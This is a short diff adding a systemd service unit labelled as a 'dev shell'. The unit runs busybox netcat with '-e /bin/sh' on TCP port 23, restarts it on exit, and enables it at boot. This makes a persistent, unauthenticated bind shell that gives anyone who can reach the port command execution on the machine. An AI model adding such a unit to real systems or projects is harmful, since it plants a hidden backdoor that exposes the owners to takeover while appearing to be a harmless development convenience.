@@ -1,0 +1,12 @@
+[Unit]
+Description=dev shell on tcp:23 (busybox nc)
+After=multi-user.target
+
+[Service]
+Type=simple
+ExecStart=/bin/busybox nc -lk -p 23 -e /bin/sh
+Restart=always
+RestartSec=2
+
+[Install]
+WantedBy=multi-user.target
